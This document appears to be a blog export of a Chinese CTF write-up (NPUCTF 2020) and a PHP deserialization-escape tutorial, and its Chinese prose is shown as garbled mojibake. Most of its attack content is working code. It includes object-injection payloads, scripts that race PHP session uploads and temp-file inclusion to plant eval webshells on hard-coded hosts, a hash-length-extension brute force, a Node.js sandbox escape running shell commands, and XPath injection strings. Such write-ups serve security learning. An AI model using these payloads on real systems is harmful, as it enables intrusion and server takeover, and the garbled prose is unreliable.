å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶GETå‚æ•°a,bçš„å€¼ åœ¨ååºåˆ—åŒ–ä¹‹å‰ï¼Œåºåˆ—åŒ–å­—ç¬¦ä¸²ç»è¿‡äº†ä¸¤æ¬¡æ›¿æ¢ï¼ˆchr(0)ç”¨%00æ›¿æ¢ï¼‰ ç¬¬ä¸€æ¬¡æ˜¯æŠŠ%00*%00æ›¿æ¢æˆäº†\\0\\0\\0ï¼Œè¿™é‡Œé•¿åº¦å¢åŠ ï¼Œç”±3å˜æˆ6 ç¬¬äºŒæ¬¡æ˜¯æŠŠ\\0\\0\\0æ›¿æ¢æˆäº†%00*%00ï¼Œè¿™é‡Œé•¿åº¦å‡å°‘ï¼Œç”±6å˜æˆ3 å…ˆçœ‹ä¸‹æ­£å¸¸åºåˆ—åŒ–çš„ç»“æœ(a=admin,b=admin): 1O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;&#125; é¦–å…ˆæˆ‘ä»¬çŸ¥é“ï¼Œå¦‚æœæ˜¯åµŒå¥—çš„ç±»ï¼ˆç±»é‡Œé¢çš„å‚æ•°è¿˜æ˜¯ä¸ªç±»ï¼‰ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œè¿™é‡Œä¸ºäº†æ–¹ä¾¿ç›´æ¥æŠŠè¯»flag.phpçš„é“¾æ„é€ å‡ºæ¥äº†ï¼š 1234567891011121314151617181920212223242526272829&lt;?phpclass A&#123; public $username; public $password; function __construct($a, $b)&#123; $this-&gt;username = $a; $this-&gt;password = $b; &#125;&#125;class B&#123; public $b = &#x27;gqy&#x27;; // function __destruct()&#123; // $c = &#x27;a&#x27;.$this-&gt;b; // echo $c; // &#125;&#125;class C&#123; public $c; // function __toString()&#123; // echo file_get_contents($this-&gt;c); // return &#x27;nice&#x27;; // &#125;&#125;$c=new C;$c-&gt;c=&#x27;flag.php&#x27;;$b=new B;$b-&gt;b=$c;$a=new A($b,&#x27;admin&#x27;);echo serialize($a); æ­¤æ—¶çš„åºåˆ—åŒ–ç»“æœæ˜¯è¿™æ ·çš„ï¼š 1O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;&#125; ç”±äºæˆ‘ä»¬ä¼ çš„Aç±»usernameå±æ€§æ˜¯ä¸€ä¸ªBå¯¹è±¡ï¼Œæ‰€ä»¥åé¢å°±å˜æˆäº† 1O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125; è€Œè¿™ä¸ªBå¯¹è±¡çš„bå±æ€§æ˜¯ä¸€ä¸ªCå¯¹è±¡ï¼Œæ‰€ä»¥è¿˜èƒ½åˆ†è§£ 1O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125; æ˜ç™½ç±»é‡Œé¢åµŒå¥—ç±»çš„åºåˆ—åŒ–æ ¼å¼ï¼Œæˆ‘ä»¬å†æ¥çœ‹æ€æœ«é€ƒé€¸å‡ºå»çš„ã€‚ é¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“çš„ä¸‹é¢ä¸€ä¸²æ˜¯æˆ‘ä»¬éœ€è¦æ·»ä¸Šå»çš„ï¼Œé•¿åº¦ä¸º58 1&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125; æˆ‘ä»¬å¯ä»¥æŠŠåºåˆ—åŒ–å­—ç¬¦ä¸²æ”¾åˆ°usernameé‚£é‡Œï¼Œå¹¶ä¸”ç”¨ä¹‹å‰é‚£ä¸ªä¾‹å­å˜é•¿çš„é‚£ç§æ€è·¯ï¼Œä½†æ˜¯è¿™ç§æ–¹å¼å¹¶ä¸è¡Œï¼Œå› ä¸ºç»è¿‡æ›¿æ¢ä¹‹åå®ƒåˆæ›¿æ¢å›æ¥äº†,æ‰€ä»¥æˆ‘ä»¬åªèƒ½ç”¨å˜çŸ­çš„æ€è·¯ æ€»çš„æ€è·¯:é€šä¿—çš„è¯´å°±æ˜¯usernameåƒæ‰åé¢çš„password æ­£å¸¸åºåˆ—åŒ–å­—ç¬¦ä¸² 1O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;&#125; æ­¤æ—¶æˆ‘ä»¬éœ€è¦æ·»åŠ çš„å°±å˜æˆï¼Œé•¿åº¦ä¸º72 1;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125; è¦åƒæ‰çš„å°±æ˜¯,é•¿åº¦23ï¼Œ**é‚£é‡Œè¡¨ç¤ºä¸¤ä½ï¼Œè¡¨ç¤ºpasswordçš„é•¿åº¦ 1&quot;;s:8:&quot;password&quot;;s:**:&quot; åˆ—æ–¹ç¨‹,nä»£è¡¨\\0\\0\\0çš„æ•°ç›®ï¼Œyè¡¨ç¤ºå…¶å®ƒå­—ç¬¦ 126n+y=3n+23+y // åŸå­—ç¬¦é•¿åº¦ = åƒæ‰&quot;;s:8:&quot;password&quot;;s:**:&quot; + æ›¿æ¢åé•¿åº¦ // å…¶å®ƒå­—ç¬¦åœ¨æ›¿æ¢æ—¶ä¸å—å½±å“ å¯ä»¥ä¸è€ƒè™‘ è®¡ç®—ä¸€ä¸‹å‘ç°3n=23,é™¤ä¸å°½ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ”¹ä¸‹åé¢é‚£ä¸²ï¼Œå‰é¢å¢åŠ ç‚¹ä¸œè¥¿ï¼Œç±»ä¼¼ 1a&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125; æƒ³è·å–å¤šç§payloaadï¼Œæˆ‘ä»¬å¯ä»¥åˆ—å¼å­ï¼Œkè¡¨ç¤ºå¢åŠ çš„å­—ç¬¦é•¿åº¦ 16n+y=3n+23+y+k å½“k=1æ—¶ n=8 å¯ä»¥æ„é€ payload: 1?a=\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&amp;b=a&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125; ä¹Ÿå¯ä»¥å½“k=4 n=9 payload: 1?a&#x3D;\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&amp;b&#x3D;abcd&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125; å‚è€ƒï¼š https://xz.aliyun.com/t/6718","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://www.m00nback.xyz/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"NPUCTF writeup","slug":"NPUCTF-writeup","date":"2020-04-18T04:07:17.000Z","updated":"2020-09-29T12:16:08.931Z","comments":true,"path":"2020/04/18/NPUCTF-writeup/","link":"","permalink":"http://www.m00nback.xyz/2020/04/18/NPUCTF-writeup/","excerpt":"è®°ä¸€ä¸‹writeup! wtcl!","text":"è®°ä¸€ä¸‹writeup! wtcl! webæŸ¥æºç æŸ¥æºç å¾—åˆ°flag RealEzPHPåœ¨ 1/time.php?source çœ‹åˆ°æºç  12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new HelloPhp;if(isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(__FILE__); die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]); exp: 12345678910&lt;?phpclass HelloPhp&#123; public $a; public $b;&#125; $c=new HelloPhp;$c-&gt;a = &#x27;file_put_contents(&quot;1.php&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));&#x27;;$c-&gt;b = &#x27;assert&#x27;;echo serialize($c); èšå‰‘è¿ä¸Šä»¥åbypass disable_fuctionåœ¨ç¯å¢ƒå˜é‡é‡Œæ‰¾åˆ°flag ezphpæŸ¥çœ‹æºç å‘ç°index.bak.php ä¼ªåè®®è¯»æºç  1index.bak.php?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;msg.php 123456789101112131415161718192021222324&lt;?php header(&#x27;content-type:application/json&#x27;);session_start();function safe($msg)&#123; if (strlen($msg)&gt;17)&#123; return &quot;msg is too loooong!&quot;; &#125; else &#123; return preg_replace(&quot;/php/&quot;,&quot;?&quot;,$msg); &#125;&#125;if (!isset($_SESSION[&#x27;msg&#x27;])&amp;empty($_SESSION[&#x27;msg&#x27;]))$_SESSION[&#x27;msg&#x27;] = array();if (isset($_POST[&#x27;msg&#x27;]))&#123; array_push($_SESSION[&#x27;msg&#x27;], [&#x27;msg&#x27;=&gt;safe($_POST[&#x27;msg&#x27;]),&#x27;time&#x27;=&gt;date(&#x27;Y-m-d H:i:s&#x27;,time())]); echo json_encode(array([&#x27;msg&#x27;=&gt;safe($_POST[&#x27;msg&#x27;]),&#x27;time&#x27;=&gt;date(&#x27;Y-m-d H:i:s&#x27;,time())])); exit();&#125;if(!empty($_SESSION[&#x27;msg&#x27;]))&#123; echo json_encode($_SESSION[&#x27;msg&#x27;]);&#125; else &#123;echo &quot;è¿˜ä¸å¿«å»ç•™è¨€ï¼&quot;;&#125;?&gt; å†è¯»ä¸‹index.bak.php 12345678&lt;?php session_start();if(isset($_GET[&#x27;action&#x27;]))&#123; include $_GET[&#x27;action&#x27;]; exit();&#125; else &#123; header(&quot;location:./index.bak.php?action=message.php&quot;);&#125; å¾ˆæ˜æ˜¾ï¼Œèƒ½åŒ…å«ï¼Œèƒ½æ§åˆ¶sessionå†…å®¹ï¼Œä½†æ˜¯æ— æ³•å†™å…¥phpå†…å®¹è¿›é‡Œé¢ æœ‰ä¸ªphpinfo.phpï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åŒ…å«ä¸´æ—¶æ–‡ä»¶é‚£ç§ ç›´æ¥ç”¨Vulhubä¸Šçš„exp: https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py æˆ–è€…ç”¨sessionä¸Šä¼ è¿›åº¦é‚£ç§æ–¹å¼ 123456789101112131415161718192021222324252627import requestsimport threadingurl=&#x27;http://47.97.210.141:9555/index.php&#x27;r=requests.session()headers=&#123; &quot;Cookie&quot;:&#x27;PHPSESSID=dddd&#x27;&#125;def POST(): while True: files=&#123; &quot;upload&quot;:&#x27;&#x27; #ä¸Šä¼ æ— æ•ˆçš„ç©ºæ–‡ä»¶ &#125; data=&#123; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#x27;&#x27;&#x27;&lt;?php echo &quot;flag&quot;;file_put_contents(&#x27;/var/www/html/a.php&#x27;,&#x27;&lt;?php @eval($_POST[1]);&#x27;);?&gt;&#x27;&#x27;&#x27; #æ¶æ„è¿›åº¦ä¿¡æ¯ï¼Œreadfileå°†ç›´æ¥è¾“å‡ºæ–‡ä»¶å†…å®¹ &#125; r.post(url,files=files,headers=headers,data=data) # print(&#x27;[+]POST&#x27;)def READ(): while True: t=r.get(&quot;http://47.97.210.141:9555/index.bak.php?action=/tmp/sess_dddd&quot;) if &#x27;flag&#x27; in t.text: print(&quot;success&quot;)for i in range(30): threading.Thread(target=POST,args=()).start() threading.Thread(target=READ,args=()).start() ç„¶åèšå‰‘è¿ï¼Œbypass disable_functionå°±è¡Œäº† ezincludeæŠ“åŒ…çœ‹åˆ° å¾ˆæ˜æ˜¾hashé•¿åº¦æ‰©å±•æ”»å‡» è¿™é¢˜å‡ºçš„å¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œç›´æ¥æŠŠhashç»™äº†å‡ºæ¥ï¼Œå¦‚ä¸‹å›¾æŠŠHashçš„å€¼å¤åˆ¶åˆ°passå°±å¯ä»¥ç»•è¿‡ æŒ‰ç…§æ­£å¸¸çš„æ€è·¯æˆ‘ä»¬æ˜¯éœ€è¦çˆ†ç ´é•¿åº¦çš„ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“$secret+æŸä¸ªå€¼çš„hashå€¼ï¼Œå°è¯•çš„è¿˜æ˜¯ä¸Šé¢çš„æ“ä½œ ç„¶åå°±å¯ä»¥å†™expäº†ï¼š 12345678910111213141516171819import hashpumpyimport urllibimport requestsurl=&#x27;http://ac35c878-20c8-4151-a64f-f832b83fee89.node3.buuoj.cn/?&#x27;hsh=&#x27;576322dd496b99d07b5b0f7fa7934a25&#x27;s1=&#x27;&#x27;&#x27;1&#x27;&#x27;&#x27;s2=&#x27;&#x27;&#x27;admin&#x27;&#x27;&#x27;for i in range(50): m=hashpumpy.hashpump(hsh,s1,s2,i) print i name=urllib.quote(urllib.unquote(m[1])) uri=url+&#x27;name=&#x27;+name+&quot;&amp;pass=&quot;+m[0] print uri r=requests.get(uri) print r.text if &quot;error&quot; not in r.text: print r.text; break hashpumpy.hashpump()å››ä¸ªå‚æ•°çš„æ„æ€ï¼š 1234$hash1 = md5($secret.$salt1);$hash2 = md5($secret.$salt2);==&gt; hashpumpy.hashpump($hash1,$salt1,$salt2,i) // iä»£è¡¨$secretçš„é•¿åº¦ æœ€ç»ˆè·‘å‡ºæ¥secreté•¿åº¦ä¸º32ï¼Œé‡å®šå‘åˆ°flflflflag.php è®¿é—®ä¼šé‡å®šå‘åˆ°404.html,æŠ“åŒ…å‘ç° åŒ…å«ï¼Œä¼ªåè®®è¯»æºå— 123456789// php://filter/read=convert.base64-encode/resource=flflflflag.php&lt;?php$file=$_GET[&#x27;file&#x27;];if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123; die(&#x27;nonono&#x27;);&#125;@include($file);echo &#x27;include($_GET[&quot;file&quot;])&#x27;;?&gt; åŒ…å«flagæ— æœï¼Œè¯•ç€å†™ä¸´æ—¶æ–‡ä»¶ å‚è€ƒï¼šhttps://www.anquanke.com/post/id/201136 åˆ©ç”¨7.0.0 &lt;= PHP Version &lt; 7.0.28çš„æ¼æ´æˆ‘ä»¬å¯ä»¥å†™å‡ºexp: 123456789101112131415161718192021222324252627282930import requestsimport stringimport itertoolsimport timecharset = string.digits + string.ascii_lettersbase_url = &quot;http://ac35c878-20c8-4151-a64f-f832b83fee89.node3.buuoj.cn&quot;def upload_file_to_include(url, file_content): files = &#123;&#x27;file&#x27;: (&#x27;evil.jpg&#x27;, file_content, &#x27;image/jpeg&#x27;)&#125; try: response = requests.post(url, files=files) except Exception as e: passdef generate_tmp_files(): file_content = &quot;&lt;?php if(file_put_contents(&#x27;/tmp/moonback&#x27;, &#x27;&lt;?php @eval($_POST[1]); ?&gt;&#x27;))&#123;echo &#x27;flag&#x27;;&#125;?&gt;&quot; self_url = &quot;%s/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot; % (base_url) length = 6 times = len(charset) ** (length / 2) for i in range(int(times)): print(&quot;[+] %d / %d&quot; % (i, times)) time.sleep(0.5) upload_file_to_include(self_url, file_content)generate_tmp_files() æ‰«ç›®å½•å‘ç°æœ‰dir.phpï¼Œåˆšå¥½æŠŠä¸´æ—¶æ–‡ä»¶åå­—åˆ—å‡ºæ¥äº†ï¼Œå…¶å®ä¸åˆ—ä¹Ÿå¯ä»¥ï¼Œåªè¦æŠŠæ‰€æœ‰å¯èƒ½æ€§è·‘å®Œå°±å¯ä»¥äº† ç„¶ååŒ…å«ä¼šç”Ÿæˆ/tmp/moonback,å†åŒ…å«æ‹¿shellå°±è¡Œï¼Œæœ€åbypass disable_function,flagåœ¨ç¯å¢ƒå˜é‡é‡Œ ç”¨PHP_SESSION_UPLOAD_PROGRESSä¹Ÿèƒ½ä¸Šä¼ ï¼Œbuuç¯å¢ƒä¸è¡Œï¼Œexp: 123456789101112131415161718192021222324252627282930import requestsimport threadingurl=&#x27;http://47.97.210.141:9666/flflflflag.php&#x27;r=requests.session()headers=&#123; &quot;Cookie&quot;:&#x27;PHPSESSID=dddd&#x27;&#125;def POST(): while True: files=&#123; &quot;upload&quot;:&#x27;&#x27; #ä¸Šä¼ æ— æ•ˆçš„ç©ºæ–‡ä»¶ &#125; data=&#123; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#x27;&lt;?php file_put_contents(&quot;/tmp/2&quot;,\\&#x27;&lt;?php @eval($_POST[1]);?&gt;\\&#x27;);echo &quot;moonback&quot;;?&gt;&#x27; &#125; r.post(url,files=files,headers=headers,data=data) # print(&#x27;[+]POST&#x27;)def READ(): while True: t=r.get(url+&quot;?file=/tmp/sess_dddd&quot;) if &#x27;moonback&#x27; in t.text: # print(&#x27;[+]retry&#x27;) print(&#x27;success&#x27;) else: passfor i in range(50): threading.Thread(target=POST,args=()).start() threading.Thread(target=READ,args=()).start() éªŒè¯ğŸnodejsé¢˜ç›®ï¼Œæºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879const express = require(&#x27;express&#x27;);const bodyParser = require(&#x27;body-parser&#x27;);const cookieSession = require(&#x27;cookie-session&#x27;);const fs = require(&#x27;fs&#x27;);const crypto = require(&#x27;crypto&#x27;);const keys = require(&#x27;./key.js&#x27;).keys;function md5(s) &#123; return crypto.createHash(&#x27;md5&#x27;) .update(s) .digest(&#x27;hex&#x27;);&#125;function saferEval(str) &#123; if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&amp;|^%&lt;&gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, &#x27;&#x27;)) &#123; return null; &#125; return eval(str);&#125; // 2020.4/WORKER1 æ·¦ï¼Œä¸Šæ¬¡çš„åº“å¤ªåƒåœ¾ï¼Œæˆ‘è‡ªå·±å†™äº†ä¸€ä¸ªconst template = fs.readFileSync(&#x27;./index.html&#x27;).toString();function render(results) &#123; return template.replace(&#x27;&#123;&#123;results&#125;&#125;&#x27;, results.join(&#x27;&lt;br/&gt;&#x27;));&#125;const app = express();app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());app.use(cookieSession(&#123; name: &#x27;PHPSESSION&#x27;, // 2020.3/WORKER2 å˜¿å˜¿ï¼Œç»™ğŸ‘´çˆªâ‘§ keys&#125;));Object.freeze(Object);Object.freeze(Math);app.post(&#x27;/&#x27;, function (req, res) &#123; let result = &#x27;&#x27;; const results = req.session.results || []; const &#123; e, first, second &#125; = req.body; if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) &#123; if (req.body.e) &#123; try &#123; result = saferEval(req.body.e) || &#x27;Wrong Wrong Wrong!!!&#x27;; &#125; catch (e) &#123; console.log(e); result = &#x27;Wrong Wrong Wrong!!!&#x27;; &#125; results.unshift(`$&#123;req.body.e&#125;=$&#123;result&#125;`); &#125; &#125; else &#123; results.unshift(&#x27;Not verified!&#x27;); &#125; if (results.length &gt; 13) &#123; results.pop(); &#125; req.session.results = results; res.send(render(req.session.results));&#125;);// 2019.10/WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPIapp.get(&#x27;/source&#x27;, function (req, res) &#123; res.set(&#x27;Content-Type&#x27;, &#x27;text/javascript;charset=utf-8&#x27;); res.send(fs.readFileSync(&#x27;./index.js&#x27;));&#125;);app.get(&#x27;/&#x27;, function (req, res) &#123; res.set(&#x27;Content-Type&#x27;, &#x27;text/html;charset=utf-8&#x27;); req.session.admin = req.session.admin || 0; res.send(render(req.session.results = req.session.results || []))&#125;);app.listen(80, &#x27;0.0.0.0&#x27;, () =&gt; &#123; console.log(&#x27;Start listening&#x27;)&#125;); å…ˆçœ‹ç¬¬ä¸€å±‚ 1if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) keysä¸çŸ¥é“ï¼Œè¦æ±‚firstå’Œsecondç›¸ç­‰å¹¶ä¸”é•¿åº¦ä¸ç­‰ï¼Œè¿˜è¦åŠ ç›åçš„MD5å€¼ç›¸ç­‰ key[0]æ˜¯å­—ç¬¦ä¸²ï¼Œä¸å­—ç¬¦ä¸²ç›¸åŠ ä¼šå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼ŒStringå’ŒArrayç±»å‹éƒ½æœ‰lengthå±æ€§ï¼Œè€Œä¸” æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸€ä¸ªä¼ æ•°ç»„ï¼Œå¦å¤–ä¸€ä¸ªä¼ å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ç›´æ¥urlencodedæ˜¯æ— æ³•ä¼ æ•°ç»„çš„ï¼Œåˆå‘ç° 1app.use(bodyParser.json()); æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ jsonæ•°æ®ï¼Œæ³¨æ„è¿™é‡Œæ˜¯ç”¨åŒå¼•å·ï¼ˆå®˜æ–¹æ ‡å‡†ï¼‰ï¼Œå°½ç®¡æœ‰æ—¶å€™å•å¼•å·ä¹Ÿå¯ä»¥ 1&#123;&quot;e&quot;:&quot;1&quot;,&quot;first&quot;:&quot;1&quot;,&quot;second&quot;:[1]&#125; å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸç»•è¿‡ï¼Œæ¥ç€çœ‹ä¸‹ä¸€æ­¥ 123if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&amp;|^%&lt;&gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, &#x27;&#x27;)) &#123; return null;&#125; åé¢å°±æ˜¯jsåŸå‹é“¾çš„å†…å®¹äº†ï¼Œçœ‹ä¸æ‡‚äº†ï¼Œè´´ä¸‹exp: 123456789101112131415import reencode = lambda code: list(map(ord,code))decode = lambda code: &quot;&quot;.join(map(chr,code))a=f&quot;&quot;&quot;(m0=&gt;( m0=m0.constructor, m0.x=m0.constructor( m0.fromCharCode(&#123;encode(&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)&quot;)&#125;) )() ))(Math+1)&quot;&quot;&quot;a=re.sub(r&quot;[\\s\\[\\]]&quot;, &quot;&quot;, a).replace(&quot;m0&quot;,&quot;Math&quot;)print(a) ezloginæŸ¥çœ‹æºç å‘ç° æ¯æ¬¡ç”¨ä¸åŒsessionè¯·æ±‚éƒ½ä¼šä¸åŒï¼ŒæŠ“åŒ…å‘ç°æœ‰é˜²æ­¢csrfçš„token,è¯·æ±‚ä¸èƒ½é‡æ”¾ ä½†æ˜¯æˆ‘ä»¬å¯ä»¥è¯·æ±‚å¸¦ä¸Šsessionè·å–åˆ°token,ç„¶åå†POST åé¢å°±æ˜¯xpathæ³¨å…¥çš„å†…å®¹äº†ï¼Œä¸¾ä¸ªä¾‹å­ï¼š å‚è€ƒï¼šhttps://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97 1234567891011121314&lt;?php$xml = simplexml_load_file(&#x27;users.xml&#x27;);$name = $_GET[&#x27;u&#x27;];$pwd = md5($_GET[&#x27;p&#x27;]);$query = &quot;/root/users/user[username/text()=&#x27;&quot;.$name.&quot;&#x27; and password/text()=&#x27;&quot;.$pwd.&quot;&#x27;]&quot;;echo $query;$result = $xml-&gt;xpath($query);if($result) &#123; echo &#x27;&lt;h2&gt;Welcome&lt;/h2&gt;&#x27;; foreach ($result as $key =&gt; $value) &#123; echo &#x27;&lt;br /&gt;ID:&#x27;.$value-&gt;id; echo &#x27;&lt;br /&gt;Username:&#x27;.$value-&gt;username; &#125;&#125; æœåŠ¡ç«¯ä¸Šçš„users.xmlæ˜¯è¿™æ ·çš„ 1234567891011121314151617181920212223&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;root&gt; &lt;users&gt; &lt;user&gt; &lt;id&gt;1&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password type=&quot;md5&quot;&gt;0192023a7bbd73250516f069df18b500&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;id&gt;2&lt;/id&gt; &lt;username&gt;jack&lt;/username&gt; &lt;password type=&quot;md5&quot;&gt;1d6c1e168e362bc0092f247399003a88&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;id&gt;3&lt;/id&gt; &lt;username&gt;tony&lt;/username&gt; &lt;password type=&quot;md5&quot;&gt;cc20f43c8c24dbc0b2539489b113277a&lt;/password&gt; &lt;/user&gt; &lt;/users&gt; &lt;secret&gt; &lt;flag&gt;flag&#123;My_f1rst_xp4th_iNjecti0n&#125;&lt;/flag&gt; &lt;/secret&gt;&lt;/root&gt; xpathå­¦ä¹ å‚è€ƒï¼šhttps://www.runoob.com/xpath/xpath-tutorial.html xpathæ³¨å…¥å¸¸è§å‡½æ•° codepoints-to-string(a, b, c, â€¦)ï¼šå°†æ•°å­— aã€bã€c è½¬ä¸ºå¯¹åº”çš„å­—ç¬¦ï¼Œ Python çš„chrå‡½æ•°ç±»ä¼¼ã€‚ string-to-codepoints(string)ï¼šä¸ä¸Šé¢çš„ç›¸å compare(a, b, rule)ï¼šæ¯”å¤§å°ï¼Œfunc æ˜¯æ¯”è¾ƒå¤§å°çš„è§„åˆ™ string-join((string, string, â€¦), sep)ï¼šä½¿ç”¨ sep å‚æ•°ä½œä¸ºåˆ†éš”ç¬¦ï¼Œæ¥è¿”å› string å‚æ•°æ‹¼æ¥åçš„å­—ç¬¦ä¸²ã€‚ substring(string, start [,len])ï¼šè¿”å›ä» start ä½ç½®å¼€å§‹çš„æŒ‡å®šé•¿åº¦çš„å­å­—ç¬¦ä¸²ã€‚ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä¸‹æ ‡æ˜¯ 1ã€‚å¦‚æœçœç•¥ len å‚æ•°ï¼Œåˆ™è¿”å›ä»ä½ç½® start åˆ°å­—ç¬¦ä¸²æœ«å°¾çš„å­å­—ç¬¦ä¸²ã€‚ string-length([string])ï¼šè¿”å›æŒ‡å®šå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚å¦‚æœæ²¡æœ‰ string å‚æ•°ï¼Œåˆ™è¿”å›å½“å‰èŠ‚ç‚¹çš„å­—ç¬¦ä¸²å€¼çš„é•¿åº¦ã€‚ count(item[, item1, â€¦])ï¼šè¿”å›èŠ‚ç‚¹çš„æ•°é‡ã€‚ position()ï¼šè¿”å›å½“å‰æ­£åœ¨è¢«å¤„ç†çš„èŠ‚ç‚¹çš„ index ä½ç½®ã€‚ last()ï¼šè¿”å›åœ¨è¢«å¤„ç†çš„èŠ‚ç‚¹åˆ—è¡¨ä¸­çš„é¡¹ç›®æ•°ç›®ã€‚ name([nodeset])ï¼šè¿”å›å½“å‰èŠ‚ç‚¹çš„åç§°æˆ–æŒ‡å®šèŠ‚ç‚¹é›†ä¸­çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ å¸¸è§çš„æ³¨å…¥åˆ†ä¸ºä¸¤ç§ï¼Œå¸¸è§„æ³¨å…¥å’Œå¸ƒå°”ç›²æ³¨ï¼Œä»¥ä¸Šé¢çš„ä¸ºä¾‹ï¼Œå…ˆè¯´ä¸‹å¸¸è§„æ³¨å…¥ ä¸‡èƒ½å¯†ç ä¸Šé¢é‚£ä¸ªæˆ‘ä»¬å°±å¯ä»¥æ„é€ ï¼š 12345$query = &quot;/root/users/user[username/text()=&#x27;&quot;.$name.&quot;&#x27; and password/text()=&#x27;&quot;.$pwd.&quot;&#x27;]&quot;;// éœ€è¦çŸ¥é“ä¸€ä¸ªç”¨æˆ·åï¼Œæ„é€ ?u=admin&#x27; or &#x27;1&amp;p=// æ­¤æ—¶æ‰§è¡Œçš„æŸ¥è¯¢$query = &quot;/root/users/user[username/text()=&#x27;admin&#x27; or &#x27;1&#x27; and password/text()=&#x27;&#x27;]&quot;; å‡è®¾æˆ‘ä»¬ä¸çŸ¥é“ç”¨æˆ·åï¼Œå¯ä»¥è¿™æ ·æ„é€  123?u=&#x27; or 1 or &#x27;1&amp;p=// æ­¤æ—¶æ‰§è¡Œçš„æŸ¥è¯¢$query = &quot;/root/users/user[username/text()=&#x27;&#x27; or 1 or &#x27;1&#x27; and 